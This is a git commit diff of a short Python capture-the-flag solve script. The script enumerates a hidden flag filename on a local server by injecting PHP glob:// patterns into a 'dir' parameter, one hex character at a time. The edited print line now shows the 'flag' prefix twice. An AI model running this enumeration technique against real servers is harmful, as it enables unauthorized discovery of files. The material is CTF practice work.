014bada5b793ffb65f1f184f03dea81fafe371a9
marvhus <44480334+marvhus@users.noreply.github.com>
2022-08-29 23:47:58 +0200

    Update solve.py

--- solve.py
+++ solve.py
@@ -1,27 +1,32 @@
 import requests
 
 URL = "http://0.0.0.0:8000"
-chars = ''
+chars = 'flag'
 
 alphabet = "abcdefABCDEF0123456789"
 
 for i in range(15):
+    # loop over all the possible chars it could be
     for char in alphabet:
-        PARAMS  = { 'dir': f'glob://./flag{chars}{char}*' }
+        # Check if the char matches
+        PARAMS  = { 'dir': f'glob://./{chars}{char}*' }
         r =requests.get(url = URL, params = PARAMS)
         if r.text.__contains__('<br>'):
             chars += char
             break
-
+    
+    # Print the found hex so far
     print("flag" + chars)
     
-    PARAMS = { 'dir': f'glob://./flag{chars}.txt' }
+    # Check if the hex ends early
+    PARAMS = { 'dir': f'glob://./{chars}.txt' }
     r = requests.get(url = URL, params = PARAMS)
     if r.text.__contains__('<br>'):
         print('end')
         break
 
-final = f"flag{chars}.txt"
+# Just make sure everything is correct
+final = f"{chars}.txt"
 PARAMS = {'dir': 'glob://./' + final}
 r = requests.get(url = URL, params = PARAMS)
 print(r.text.__contains__('<br>'))
